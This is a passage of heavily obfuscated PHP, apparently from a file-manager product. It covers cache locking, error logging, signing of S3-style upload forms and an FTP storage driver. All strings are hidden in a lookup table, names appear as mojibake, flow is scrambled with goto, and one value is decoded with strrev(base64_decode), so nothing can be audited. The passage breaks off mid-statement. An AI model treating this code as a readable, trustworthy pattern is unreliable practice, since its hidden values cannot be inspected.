goto fæÚﬁ·…À≈; f∞úéãÓÔÒ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a®…Óı¥ªæ =& $_SERVER[¯èãÄπµ]; $d¢√‰Ó≥¨å = $GLOBALS[$a®…Óı¥ªæ[6]][$a®…Óı¥ªæ[333]]; self::$cachePath = $d¢√‰Ó≥¨å[$a®…Óı¥ªæ[163]][$a®…Óı¥ªæ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($c…¶ú›ÀÚ¿, $C¨≤‘üÛëÇ = 0) { goto fóÉî∆âŒ; fóÉî∆âŒ: $bíËˆ¥ÌêÔ =& $_SERVER[¯èãÄπµ]; $c¯Ÿ±ÓÊç€ = microtime(!0); $f„≤—ŸˆÙﬁ = $c¯Ÿ±ÓÊç€ + $C¨≤‘üÛëÇ + 0.0001; goto C•ûΩ›Çﬁ”; bâ”π≠çÏ¢: $this->unlock($c…¶ú›ÀÚ¿); return !1; goto bä‰Û›˘«õ; C•ûΩ›Çﬁ”: $D Ç¢ªÿ§Ï = rtrim(self::$cachePath, $bíËˆ¥ÌêÔ[8]) . $bíËˆ¥ÌêÔ[775] . md5($c…¶ú›ÀÚ¿) . $bíËˆ¥ÌêÔ[776]; if (file_exists($D Ç¢ªÿ§Ï) && filemtime($D Ç¢ªÿ§Ï) && filemtime($D Ç¢ªÿ§Ï) < time() - 10) { @unlink($D Ç¢ªÿ§Ï); } do { if (file_exists($D Ç¢ªÿ§Ï)) { cacheLockWait(); continue; } $EÀä‚á¶ŸÙ = fopen($D Ç¢ªÿ§Ï, $bíËˆ¥ÌêÔ[777]); if (!$EÀä‚á¶ŸÙ) { return !1; } $BÚäÁ∆ÊÜ  = flock($EÀä‚á¶ŸÙ, LOCK_EX | LOCK_NB); self::$caches[$c…¶ú›ÀÚ¿] = array($bíËˆ¥ÌêÔ[778] => $EÀä‚á¶ŸÙ, $bíËˆ¥ÌêÔ[163] => $D Ç¢ªÿ§Ï); fwrite($EÀä‚á¶ŸÙ, $f„≤—ŸˆÙﬁ); clearstatcache(); if ($EÀä‚á¶ŸÙ && $BÚäÁ∆ÊÜ ) { return !0; } cacheLockWait(); } while (microtime(!0) < $f„≤—ŸˆÙﬁ); goto bâ”π≠çÏ¢; bä‰Û›˘«õ: } public function lockGet($cä§ú∆—∂Ü) { $aﬁÍÏØ„—û =& $_SERVER[¯èãÄπµ]; $C∆éÖ”Ïôú = rtrim(self::$cachePath, $aﬁÍÏØ„—û[8]) . $aﬁÍÏØ„—û[775] . md5($cä§ú∆—∂Ü) . $aﬁÍÏØ„—û[776]; return file_exists($C∆éÖ”Ïôú); } public function unlock($Cœ∞ƒ¡¯È°) { goto DîÛ§îÀÃó; e◊ñèÙŸË∆: @flock($fÏƒ¥ü‡˘†[$CÔóäàãøë[778]], LOCK_UN); @fclose($fÏƒ¥ü‡˘†[$CÔóäàãøë[778]]); @unlink($fÏƒ¥ü‡˘†[$CÔóäàãøë[163]]); goto Aîî˘´ıéâ; DîÛ§îÀÃó: $CÔóäàãøë =& $_SERVER[¯èãÄπµ]; $fÏƒ¥ü‡˘† = self::$caches[$Cœ∞ƒ¡¯È°]; if (!$fÏƒ¥ü‡˘†) { return; } goto e◊ñèÙŸË∆; Aîî˘´ıéâ: unset(self::$caches[$Cœ∞ƒ¡¯È°]); goto e√ÓÙÜÆëã; e√ÓÙÜÆëã: } } class CacheLockRedis { public function lock($cª–Áˆç≠™, $FúÊÜüÏÏà = 10) { $EÎ¬Ê’°µ£ = Cache::init(); $Cê…‹‰ñ±» = microtime(!0) + $FúÊÜüÏÏà; while (microtime(!0) < $Cê…‹‰ñ±») { $AäÇ◊“ ≤Ô = $EÎ¬Ê’°µ£->get($cª–Áˆç≠™); if (!$AäÇ◊“ ≤Ô) { $d¥ÌÙﬂ´ÖË = $EÎ¬Ê’°µ£->setLock($cª–Áˆç≠™, $Cê…‹‰ñ±», $FúÊÜüÏÏà); if ($d¥ÌÙﬂ´ÖË) { return !0; } } else { if ($AäÇ◊“ ≤Ô < microtime(!0)) { $EÎ¬Ê’°µ£->set($cª–Áˆç≠™, $Cê…‹‰ñ±», $Cê…‹‰ñ±»); if ($EÎ¬Ê’°µ£->get($cª–Áˆç≠™) === $AäÇ◊“ ≤Ô) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($dÉ›˜ŸµöÓ) { return Cache::init()->get($dÉ›˜ŸµöÓ); } public function unlock($dëêÜÜ◊æ¨) { return Cache::init()->remove($dëêÜÜ◊æ¨); } } goto d∆ŒÈ≈ÑÿÀ; CÆ⁄·ãÉ¯√: function beforeShutdownError($AÖÇ◊õ∏“î = false, $E¶á†–ìÈå = '', $Fñïå˘«∫ã = '', $Aü¥î»«ºà = 0) { $Dê∏Á¯≥∆± =& $_SERVER[ÎÏ°ﬂ±å]; switch ($AÖÇ◊õ∏“î) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $F∏€ÿ•—û© = $Dê∏Á¯≥∆±[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $F∏€ÿ•—û© = $Dê∏Á¯≥∆±[40]; break; case E_STRICT: $F∏€ÿ•—û© = $Dê∏Á¯≥∆±[41]; break; case E_NOTICE: case E_USER_NOTICE: $F∏€ÿ•—û© = $Dê∏Á¯≥∆±[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $F∏€ÿ•—û© = $Dê∏Á¯≥∆±[43]; break; default: break; } if (!$F∏€ÿ•—û© || $F∏€ÿ•—û© == $Dê∏Á¯≥∆±[42] || $F∏€ÿ•—û© == $Dê∏Á¯≥∆±[43]) { return; } $Fñïå˘«∫ã = $Dê∏Á¯≥∆±[4] . str_replace($_SERVER[$Dê∏Á¯≥∆±[37]], $Dê∏Á¯≥∆±[20], $Fñïå˘«∫ã); $EÃ‘ÊÖÇ˜ô = $F∏€ÿ•—û© . $Dê∏Á¯≥∆±[44] . $E¶á†–ìÈå . $Dê∏Á¯≥∆±[44] . $Fñïå˘«∫ã . $Dê∏Á¯≥∆±[44] . $Aü¥î»«ºà; write_log($EÃ‘ÊÖÇ˜ô . $Dê∏Á¯≥∆±[18] . get_caller_msg(1), $Dê∏Á¯≥∆±[19]); } $_SERVER[$_SERVER[ÎÏ°ﬂ±å][45]] = $_SERVER[$_SERVER[ÎÏ°ﬂ±å][37]] . $_SERVER[ÎÏ°ﬂ±å][46]; $a∫≠âéùµŸ = strrev(base64_decode($_SERVER[ÎÏ°ﬂ±å][47])); goto C±ìôõËÔ·; DÿﬂÂñ∏ÑÎ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($CÔ«à˘µÖ£) { parent::__construct($CÔ«à˘µÖ£); $this->signatureVersion($_SERVER[¯èãÄπµ][196]); } public function uploadFormData($B›π–Æ’åé, $A¡ã—¶Âïè = 3600) { goto DÖ‡—ü¨◊ã; déıíΩˆ€â: $AŒ∂øª±ÒÛ = array($this->accessKey, $A´·Ê∏Ü∂¥, $this->region, $AÕ–¡õÔäƒ, $béÇ‰á®ä); $A›Ö°èø¢Ú = implode($f¢‰è∫•ı¡[8], $AŒ∂øª±ÒÛ); $aÖÕ‡Áµ«è = array($f¢‰è∫•ı¡[1097] => gmdate($f¢‰è∫•ı¡[1096], strtotime($f¢‰è∫•ı¡[1131])), $f¢‰è∫•ı¡[1098] => array(array($f¢‰è∫•ı¡[1100] => $this->bucket), array($f¢‰è∫•ı¡[1099] => $FÚÑ°ˆ”êç), array($f¢‰è∫•ı¡[1101], $f¢‰è∫•ı¡[1102], $f¢‰è∫•ı¡[33]), array($f¢‰è∫•ı¡[1101], $f¢‰è∫•ı¡[1132], $f¢‰è∫•ı¡[33]), array($f¢‰è∫•ı¡[1101], $f¢‰è∫•ı¡[1133], $f¢‰è∫•ı¡[33]), array($f¢‰è∫•ı¡[1103] => $FäëÈÕåó¥), array($f¢‰è∫•ı¡[1134] => $A›Ö°èø¢Ú), array($f¢‰è∫•ı¡[1135] => $Fá±˜⁄Ç≤ç), array($f¢‰è∫•ı¡[1136] => $A‰∆Ñ¥≠≈ö), array($f¢‰è∫•ı¡[1137] => $d¢íÓ·øí ))); goto BŸ˘∆¯⁄„≥; B∑≤Êﬁá“ú: $a¯‚Õ√Ã‚« = array($f¢‰è∫•ı¡[195] => $f¢‰è∫•ı¡[33], $f¢‰è∫•ı¡[1140] => $f¢‰è∫•ı¡[33], $f¢‰è∫•ı¡[1099] => $FÚÑ°ˆ”êç, $f¢‰è∫•ı¡[1103] => $FäëÈÕåó¥, $f¢‰è∫•ı¡[1107] => $FØ≠ÛáèñÕ, $f¢‰è∫•ı¡[1141] => $A›Ö°èø¢Ú, $f¢‰è∫•ı¡[1142] => $Fá±˜⁄Ç≤ç, $f¢‰è∫•ı¡[1143] => $A‰∆Ñ¥≠≈ö, $f¢‰è∫•ı¡[1144] => $d¢íÓ·øí , $f¢‰è∫•ı¡[1145] => $aÔå‹–¢√É, $f¢‰è∫•ı¡[165] => $this->getHost()); return $a¯‚Õ√Ã‚«; goto CÍá≥˜Úﬂ; BŸ˘∆¯⁄„≥: $FØ≠ÛáèñÕ = base64_encode(json_encode($aÖÕ‡Áµ«è)); $Eñ®◊∏≤…ÿ = hash_hmac($f¢‰è∫•ı¡[1138], $A´·Ê∏Ü∂¥, $f¢‰è∫•ı¡[1139] . $this->secret, !0); $b¬ÒﬁÑ«Ωò = hash_hmac($f¢‰è∫•ı¡[1138], $this->region, $Eñ®◊∏≤…ÿ, !0); goto bÆ™ıﬂµµΩ; AâÚõ√ÑÙê: $béÇ‰á®ä = $f¢‰è∫•ı¡[1130]; $d¢íÓ·øí  = $A¡ã—¶Âïè . $f¢‰è∫•ı¡[33]; $FäëÈÕåó¥ = $f¢‰è∫•ı¡[1095]; goto déıíΩˆ€â; bÆ™ıﬂµµΩ: $dÃŒ«â√«” = hash_hmac($f¢‰è∫•ı¡[1138], $AÕ–¡õÔäƒ, $b¬ÒﬁÑ«Ωò, !0); $FÑ∞Ò‡°ÆÖ = hash_hmac($f¢‰è∫•ı¡[1138], $béÇ‰á®ä, $dÃŒ«â√«”, !0); $aÔå‹–¢√É = hash_hmac($f¢‰è∫•ı¡[1138], $FØ≠ÛáèñÕ, $FÑ∞Ò‡°ÆÖ); goto B∑≤Êﬁá“ú; DÖ‡—ü¨◊ã: $f¢‰è∫•ı¡ =& $_SERVER[¯èãÄπµ]; $FÚÑ°ˆ”êç = $f¢‰è∫•ı¡[181]; $Fá±˜⁄Ç≤ç = $f¢‰è∫•ı¡[1128]; goto Eº˘¢Ê÷ìÉ; Eº˘¢Ê÷ìÉ: $AÕ–¡õÔäƒ = $f¢‰è∫•ı¡[59]; $A‰∆Ñ¥≠≈ö = gmdate($f¢‰è∫•ı¡[1129]); $A´·Ê∏Ü∂¥ = gmdate($f¢‰è∫•ı¡[693]); goto AâÚõ√ÑÙê; CÍá≥˜Úﬂ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($CÇè⁄⁄íµÃ) { parent::__construct(); if (count($CÇè⁄⁄íµÃ) > 0) { $this->_init($CÇè⁄⁄íµÃ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($E ‚°àΩ∆) { $BÑî≤ã…πÖ =& $_SERVER[¯èãÄπµ]; global $config; $this->appCharset = $config[$BÑî≤ã…πÖ[1146]]; $this->systemCharset = $config[$BÑî≤ã…πÖ[1147]]; if (isset($E ‚°àΩ∆[$BÑî≤ã…πÖ[1148]]) && $E ‚°àΩ∆[$BÑî≤ã…πÖ[1148]]) { $this->systemCharset = $E ‚°àΩ∆[$BÑî≤ã…πÖ[1148]]; } } public function iconvApp($f∫à€œÆ¿ë) { return $this->iconvTo($f∫à€œÆ¿ë, $this->systemCharset, $this->appCharset); } public function iconvSystem($b…äÇÏüÊ”) { return $this->iconvTo($b…äÇÏüÊ”, $this->appCharset, $this->systemCharset); } public function getPathOuter($a⁄¢¥öî‚¨) { goto AáÙ€´Õµé; EÆ∂üÛ‚ﬁô: return $this->pathDriver . $BßÜÈ®–ê‚[8] . ltrim($a⁄¢¥öî‚¨, $BßÜÈ®–ê‚[8]); goto eú‘ú≤ÚÑ˜; CÏÔ˘€ÖàŸ: if (substr($bÈ‘°âÌ¡ƒ, 0, 2) == $BßÜÈ®–ê‚[1149]) { $bÈ‘°âÌ¡ƒ = BASIC_PATH . substr($bÈ‘°âÌ¡ƒ, 2); } if (substr($a⁄¢¥öî‚¨, 0, 2) == $BßÜÈ®–ê‚[1149]) { $a⁄¢¥öî‚¨ = BASIC_PATH . substr($a⁄¢¥öî‚¨, 2); } $bÈ‘°âÌ¡ƒ = KodIO::clear($bÈ‘°âÌ¡ƒ); goto fÃäÜ‡Â◊–; AáÙ€´Õµé: $BßÜÈ®–ê‚ =& $_SERVER[¯èãÄπµ]; $bÈ‘°âÌ¡ƒ = $this->iconvApp($this->pathBase); $a⁄¢¥öî‚¨ = $this->iconvApp($a⁄¢¥öî‚¨); goto CÏÔ˘€ÖàŸ; fÃäÜ‡Â◊–: $a⁄¢¥öî‚¨ = KodIO::clear($a⁄¢¥öî‚¨); $a⁄¢¥öî‚¨ = substr($a⁄¢¥öî‚¨, strlen($bÈ‘°âÌ¡ƒ)); if (empty($this->pathDriver)) { return $a⁄¢¥öî‚¨; } goto EÆ∂üÛ‚ﬁô; eú‘ú≤ÚÑ˜: } private function _init($C‘ÇÆ•ﬁâ° = array()) { goto A™›âƒ£¶®; A™›âƒ£¶®: $E˜ïÜÌµßÚ =& $_SERVER[¯èãÄπµ]; if (!function_exists($E˜ïÜÌµßÚ[1150])) { show_json(LNG($E˜ïÜÌµßÚ[1151]), !1); } $this->charsetReset($C‘ÇÆ•ﬁâ°); goto b«•í«‘òä; E—’Ü‰üÙã: return $fÖóÁà”óá; goto CÚÔﬁ‡Öı¿; e…ÉºÓø∏„: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $fÖóÁà”óá = @ftp_login($this->connect, $this->username, $this->userpass); goto aø•ªÚ–ä∫; Aæéá∑◊ñü: if (isset($d¶ ≈ÿøÚõ[$b–’À–À‡∞])) { foreach ($d¶ ≈ÿøÚõ[$b–’À–À‡∞] as $dÍëåÛÔëÇ => $d´ÜπäÑñÊ) { $this->{$dÍëåÛÔëÇ} = $d´ÜπäÑñÊ; } return !0; } $dè∫°ÏûâÈ = parse_url(trim($this->server, $E˜ïÜÌµßÚ[8])); $this->host = $dè∫°ÏûâÈ[$E˜ïÜÌµßÚ[165]]; goto F≠Á¶ﬁ™åŸ; b«•í«‘òä: foreach ($C‘ÇÆ•ﬁâ° as $dÍëåÛÔëÇ => $d´ÜπäÑñÊ) { if (isset($this->{$dÍëåÛÔëÇ})) { $this->{$dÍëåÛÔëÇ} = $d´ÜπäÑñÊ; } } static $d¶ ≈ÿøÚõ = array(); $b–’À–À‡∞ = md5(json_encode($C‘ÇÆ•ﬁâ°)); goto Aæéá∑◊ñü; aø•ªÚ–ä∫: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $d¶ ≈ÿøÚõ[$b–’À–À‡∞] = array($E˜ïÜÌµßÚ[1155] => $this->connect, $E˜ïÜÌµßÚ[165] => $this->host, $E˜ïÜÌµßÚ[164] => $this->scheme, $E˜ïÜÌµßÚ[166] => $this->port); goto E—’Ü‰üÙã; F≠Á¶ﬁ™åŸ: $b”ÁîŒ¿∑≥ = isset($dè∫°ÏûâÈ[$E˜ïÜÌµßÚ[164]]) && $dè∫°ÏûâÈ[$E˜ïÜÌµßÚ[164]] == $E˜ïÜÌµßÚ[1152] ? !0 : !1; $this->scheme = $b”ÁîŒ¿∑≥ ? $E˜ïÜÌµßÚ[1153] : $E˜ïÜÌµßÚ[1154]; $this->port = isset($dè∫°ÏûâÈ[$E˜ïÜÌµßÚ[166]]) ? $dè∫°ÏûâÈ[$E˜ïÜÌµßÚ[166]] : 21; goto e…ÉºÓø∏„; CÚÔﬁ‡Öı¿: } private function _isconn() { return is_resource($this->connect); } public function mkfile($b√Œ…Ò‰ª, $bè·œä™ºÿ = '', $cﬁ÷ΩñØüµ = REPEAT_RENAME) { if ($this->setContent($b√Œ…Ò‰ª, $bè·œä™ºÿ)) { return $this->getPathOuter($b√Œ…Ò‰ª); } return !1; } public function mkdir($DÏ»Ø‹≈ÌŒ, $A’ıÒ¡ÉÖË = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $DÏ»Ø‹≈ÌŒ = $this->iconvSystem($DÏ»Ø‹≈ÌŒ); if ($this->isFolder($DÏ»Ø‹≈ÌŒ) || @ftp_mkdir($this->connect, $DÏ»Ø‹≈ÌŒ)) { return $this->getPathOuter($DÏ»Ø‹≈ÌŒ); } if (!$this->mkdir($this->pathFather($DÏ»Ø‹≈ÌŒ))) { return !1; } if ($DÏ»Ø‹≈ÌŒ = @ftp_mkdir($this->connect, $DÏ»Ø‹≈ÌŒ)) { return $this->getPathOuter($DÏ»Ø‹≈ÌŒ); } return !1; } public function copyFile($e«∑´Ç§Âä, $e√•÷éÈÂá) { goto B≠°é¥Üè¢; få€”ÔπÑ¢: $DÜ“Ÿ–§â = $this->iconvApp($d’√â√ä™Ø); $this->download($e«∑´Ç§Âä, $DÜ“Ÿ–§â); $EÃ–éÒ°ÿ‚ = $this->upload($e√•÷éÈÂá, $DÜ“Ÿ–§â); goto Eåÿ∞›‹—È; B≠°é¥Üè¢: if (!$this->_isconn()) { return !1; } $cØ√†ª∫Õä = $this->pathThis($this->iconvSystem($e«∑´Ç§Âä)); $d’√â√ä™Ø = $this->tempFile($cØ√†ª∫Õä); goto få€”ÔπÑ¢; Eåÿ∞›‹—È: $this->tempFileRemve($d’√â√ä™Ø); return $EÃ–éÒ°ÿ‚; goto b”·ûœÜÊ¯; b”·ûœÜÊ¯: } public function moveFile($dîÁì©Èú, $AÊóâ·ê”˘) { if (!$this->_isconn()) { return !1; } $dîÁì©Èú = $this->iconvSystem($dîÁì©Èú); $AÊóâ·ê”˘ = $this->iconvSystem($AÊóâ·ê”˘); $Cèπ∆ûΩê = @ftp_rename($this->connect, $dîÁì©Èú, $AÊóâ·ê”˘); return $Cèπ∆ûΩê ? $this->getPathOuter($AÊóâ·ê”˘) : !1; } public function delFile($EåôΩœØâÆ) { if (!$this->_isconn()) { return !1; } $EåôΩœØâÆ = $this->iconvSystem($EåôΩœØâÆ); return @ftp_delete($this->connect, $EåôΩœØâÆ); } public function delFolder($aÜçÁå∂é‹) { if (!$this->_isconn()) { return !1; } $aÜçÁå∂é‹ = $this->iconvSystem($aÜçÁå∂é‹); $aŒŒÒã…øﬁ = $this->ftpList($aÜçÁå∂é‹); if (!$aŒŒÒã…øﬁ) { return @ftp_rmdir($this->connect, $aÜçÁå∂é‹); } foreach ($aŒŒÒã…øﬁ as $eıÚó´åëÛ) { if ($this->isFolder($eıÚó´åëÛ)) { $eıÚó´åëÛ = $this->iconvApp($eıÚó´åëÛ); $this->delFolder($eıÚó´åëÛ); } else { @ftp_delete($this->connect, $eıÚó´åëÛ); } } return @ftp_rmdir($this->connect, $aÜçÁå∂é‹); } public function rename($AáüÓŸà¡, $a⁄üäê˘ûˆ) { goto BÁÔô∫ñ∑≈; BÁÔô∫ñ∑≈: $C∆Ω“´…€û =& $_SERVER[¯èãÄπµ]; if (!$this->_isconn()) { return !1; } $FÓﬁÑûìıâ = $this->fileNameAuto($this->pathFather($AáüÓŸà¡), $a⁄üäê˘ûˆ); goto d®ÇÛ®˘±; EƒÏ®≠≠„Ë: $EÍÁü–øïù = rtrim($B€‡À‹íøØ, $C∆Ω“´…€û[8]) . $C∆Ω“´…€û[8] . $FÓﬁÑûìıâ; $DÖòôüÔßÉ = @ftp_rename($this->connect, $AáüÓŸà¡, $EÍÁü–øïù); $EÍÁü–øïù = $this->iconvApp($EÍÁü–øïù); goto açÃ‰∏Èºà; d®ÇÛ®˘±: $FÓﬁÑûìıâ = $this->iconvSystem($FÓﬁÑûìıâ); $AáüÓŸà¡ = $this->iconvSystem($AáüÓŸà¡); $B€‡À‹íøØ = $this->pathFather($AáüÓŸà¡); goto EƒÏ®≠≠„Ë; açÃ‰∏Èºà: return $DÖòôüÔßÉ ? $this->getPathOuter($EÍÁü–øïù) : !1; goto aó˘ÔËÕ†ä; aó˘ÔËÕ†ä: } private function folderInfo($BÑª¥«üí∂, $EÏ…ôÓ“üº = false) { goto E£†ÑµÇïÜ; c’ ÆÜ…´±: return $a«îÎîúéè; goto fûìÍÿ≥È; E£†ÑµÇïÜ: $a–ùÁ≥®ºõ =& $_SERVER[¯èãÄπµ]; $dÔõÂûÜä± = $this->getPathOuter(rtrim($BÑª¥«üí∂, $a–ùÁ≥®ºõ[8])); $EøÇƒáâ≠ÿ = $this->pathThis($dÔõÂûÜä±); goto eÂàã∏àÔ¡; eÂàã∏àÔ¡: $e«‘‰Í‡Ûö = $this->iconvSystem($BÑª¥«üí∂); if ($EÏ…ôÓ“üº) { return array($a–ùÁ≥®ºõ[28] => $EøÇƒáâ≠ÿ, $a–ùÁ≥®ºõ[75] => $dÔõÂûÜä±, $a–ùÁ≥®ºõ[29] => $a–ùÁ≥®ºõ[76]); } $a«îÎîúéè = array($a–ùÁ≥®ºõ[28] => $EøÇƒáâ≠ÿ, $a–ùÁ≥®ºõ[75] => $dÔõÂûÜä±, $a–ùÁ≥®ºõ[29] => $a–ùÁ≥®ºõ[76], $a–ùÁ≥®ºõ[183] => 0, $a–ùÁ≥®ºõ[106] => 0, $a–ùÁ≥®ºõ[1156] => !0, $a–ùÁ≥®ºõ[1157] => !0); goto c’ ÆÜ…´±; fûìÍÿ≥È: } private function fileInfo($CÂÉ∫á·Í¢, $fûÊºßÖŒÉ = false) { goto C…”ˆ∑§Î˜; cÍß≠¶∆Á•: $Dãä§¥õóˆ[$Cﬂ§Í¯õø[106]] = $Dãä§¥õóˆ[$Cﬂ§Í¯õø[106]] > 0 ? $Dãä§¥õóˆ[$Cﬂ§Í¯õø[106]] : 0; return $Dãä§¥õóˆ; goto D≈ÀÈëÇ´å; aâ∂◊⁄ﬁπ√: $FæâÃÀ◊ä = $this->iconvSystem($CÂÉ∫á·Í¢); if ($fûÊºßÖŒÉ) { return array($Cﬂ§Í¯õø[28] => $aªËï‚‘ñ∫, $Cﬂ§Í¯õø[75] => $D‡ïà¯»àÕ, $Cﬂ§Í¯õø[29] => $Cﬂ§Í¯õø[163], $Cﬂ§Í¯õø[156] => $this->ext($CÂÉ∫á·Í¢), $Cﬂ§Í¯õø[77] => $this->size($CÂÉ∫á·Í¢)); } $Dãä§¥õóˆ = array($Cﬂ§Í¯õø[28] => $aªËï‚‘ñ∫, $Cﬂ§Í¯õø[75] => $D‡ïà¯»àÕ, $Cﬂ§Í¯õø[29] => $Cﬂ§Í¯õø[163], $Cﬂ§Í¯õø[183] => 0, $Cﬂ§Í¯õø[106] => @ftp_mdtm($this->connect, $FæâÃÀ◊ä), $Cﬂ§Í¯õø[156] => $this->ext($CÂÉ∫á·Í¢), $Cﬂ§Í¯õø[77] => $this->size($CÂÉ∫á·Í¢), $Cﬂ§Í¯õø[1156] => !0, $Cﬂ§Í¯õø[1157] => !0); goto cÍß≠¶∆Á•; C…”ˆ∑§Î˜: $Cﬂ§Í¯õø =& $_SERVER[¯èãÄπµ]; $D‡ïà¯»àÕ = $this->getPathOuter(rtrim($CÂÉ∫á·Í¢, $Cﬂ§Í¯õø[8])); $aªËï‚‘ñ∫ = $this->pathThis($D‡ïà¯»àÕ); goto aâ∂◊⁄ﬁπ√; D≈ÀÈëÇ´å: } public function size($eÇñÊ…ﬂáÈ) { $aÔ“ﬂ—›À“ = $this->objectMeta($eÇñÊ…ﬂáÈ); return $aÔ“ﬂ—›À“ ? $aÔ“ﬂ—›À“[$_SERVER[¯èãÄπµ][77]] : 0; } public function info($E–Ñ¶Ó†Íò) { if ($this->isFile($E–Ñ¶Ó†Íò)) { return $this->fileInfo($E–Ñ¶Ó†Íò, 0); } else { if ($this->isFolder($E–Ñ¶Ó†Íò)) { return $this->folderInfo($E–Ñ¶Ó†Íò); } } return !1; } public function exist($F™ù≤Ê‹° ) { return $this->objectMeta($F™ù≤Ê‹° ) ? !0 : !1; } public function isFile($b…√à»‹ñŒ) { $fƒÆπØπµÍ =& $_SERVER[¯èãÄπµ]; $AËäÚ¶ﬁ™Ú = $this->objectMeta($b…√à»‹ñŒ); return $AËäÚ¶ﬁ™Ú ? $AËäÚ¶ﬁ™Ú[$fƒÆπØπµÍ[29]] == $fƒÆπØπµÍ[163] : !1; } public function isFolder($BÖ∏ËÙ§äñ) { $dÏ‡≈ª·°õ =& $_SERVER[¯èãÄπµ]; $b√áçŒﬁ´– = $this->objectMeta($BÖ∏ËÙ§äñ); return $b√áçŒﬁ´– ? $b√áçŒﬁ´–[$dÏ‡≈ª·°õ[29]] == $dÏ‡≈ª·°õ[76] : !1; } public function listPath($cª◊≈ÙƒÑù, $Fæ‘≤äê∑æ = false) { goto A˜Ãﬁ»µ⁄⁄; FÍ˘›ØÀÓ•: foreach ($aÈ¢≥‰É∑æ as $cª◊≈ÙƒÑù) { if ($this->isFolder($cª◊≈ÙƒÑù)) { $a¬øÍﬁå∑˜[$D¯¢¨ºØ—∏[74]][] = $this->folderInfo($cª◊≈ÙƒÑù, $Fæ‘≤äê∑æ); } else { $a¬øÍﬁå∑˜[$D¯¢¨ºØ—∏[73]][] = $this->fileInfo($cª◊≈ÙƒÑù, $Fæ‘≤äê∑æ); } } return $a¬øÍﬁå∑˜; goto Aá ¥ ◊Òî; eÁ¿ÓÁ—£°: $aÈ¢≥‰É∑æ = $this->ftpList($cª◊≈ÙƒÑù); $a¬øÍﬁå∑˜ = array($D¯¢¨ºØ—∏[74] => array(), $D¯¢¨ºØ—∏[73] => array()); if (!$aÈ¢≥‰É∑æ) { return $a¬øÍﬁå∑˜; } goto FÍ˘›ØÀÓ•; A˜Ãﬁ»µ⁄⁄: $D¯¢¨ºØ—∏ =& $_SERVER[¯èãÄπµ]; if (!$this->_isconn()) { return !1; } $cª◊≈ÙƒÑù = $this->iconvSystem($cª◊≈ÙƒÑù); goto eÁ¿ÓÁ—£°; Aá ¥ ◊Òî: } public function has($f≈ŸÍÔë‰Ü, $EœØ–◊ﬁìı = false, $FÓÁáñµ†ó = true) { goto dÆΩÎ–“≥Û; B¡ÑìçÁÑÏ: foreach ($aÌÒ∂û∫¶≥ as $f≈ŸÍÔë‰Ü) { if ($FÓÁáñµ†ó) { if (!$this->isFolder($f≈ŸÍÔë‰Ü)) { return !0; } } else { if ($this->isFolder($f≈ŸÍÔë‰Ü)) { return !0; } } } return !1; goto DÏ…ÊÔºê©; dÆΩÎ–“≥Û: $cÖÍ∞⁄ëÉ£ =& $_SERVER[¯èãÄπµ]; if (!$this->_isconn()) { return !1; } $f≈ŸÍÔë‰Ü = $this->iconvSystem($f≈ŸÍÔë‰Ü); goto Eçß¡‡¥üä; Eçß¡‡¥üä: $aÌÒ∂û∫¶≥ = $this->ftpList($f≈ŸÍÔë‰Ü); if (!$aÌÒ∂û∫¶≥) { return !1; } if ($EœØ–◊ﬁìı) { return array($cÖÍ∞⁄ëÉ£[187] => 0, $cÖÍ∞⁄ëÉ£[188] => count($aÌÒ∂û∫¶≥)); } goto B¡ÑìçÁÑÏ; DÏ…ÊÔºê©: } public function listAll($A‰¢Ë≥„©à) { goto f÷≤€íÌÜÖ; fé©∏‘ˆü∏: $cçá±”ΩÚ„ = array($cﬂƒ˘é–ﬁî[73] => array(), $cﬂƒ˘é–ﬁî[74] => array()); $this->recursionFtpFiles($A‰¢Ë≥„©à, $cçá±”ΩÚ„); $Aú¥ﬂÒÆÔ⁄ = array(); goto cˆîÑ÷É≠©; f÷≤€íÌÜÖ: $cﬂƒ˘é–ﬁî =& $_SERVER[¯èãÄπµ]; if (!$this->_isconn()) { return !1; } $A‰¢Ë≥„©à = $this->iconvSystem($A‰¢Ë≥„©à); goto fé©∏‘ˆü∏; cˆîÑ÷É≠©: foreach ($cçá±”ΩÚ„[$cﬂƒ˘é–ﬁî[74]] as $aÑ†Ûâå¶˜) { $Aú¥ﬂÒÆÔ⁄[] = array($cﬂƒ˘é–ﬁî[75] => $cﬂƒ˘é–ﬁî[8] . trim(str_replace($A‰¢Ë≥„©à, $cﬂƒ˘é–ﬁî[33], $aÑ†Ûâå¶˜), $cﬂƒ˘é–ﬁî[8]) . $cﬂƒ˘é–ﬁî[8], $cﬂƒ˘é–ﬁî[76] => 1, $cﬂƒ˘é–ﬁî[77] => 0); } foreach ($cçá±”ΩÚ„[$cﬂƒ˘é–ﬁî[73]] as $d´áÕÇ¿ä◊) { $Aú¥ﬂÒÆÔ⁄[] = array($cﬂƒ˘é–ﬁî[75] => $cﬂƒ˘é–ﬁî[8] . trim(str_replace($A‰¢Ë≥„©à, $cﬂƒ˘é–ﬁî[33], $d´áÕÇ¿ä◊), $cﬂƒ˘é–ﬁî[8]), $cﬂƒ˘é–ﬁî[76] => 0, $cﬂƒ˘é–ﬁî[77] => $this->size($d´áÕÇ¿ä◊)); } return $Aú¥ﬂÒÆÔ⁄; goto AùƒÏŸöÖ≤; AùƒÏŸöÖ≤: } public function getContent($f‘±ëÛäÜõ) { if (!$this->_isconn()) { return !1; } $f‘±ëÛäÜõ = $this->iconvSystem($f‘±ëÛäÜõ); return $this->fileSubstr($f‘±ëÛäÜõ); } public function setContent($D®—¿·¶¥†, $C¿Û˘ÇπëΩ = '') { goto 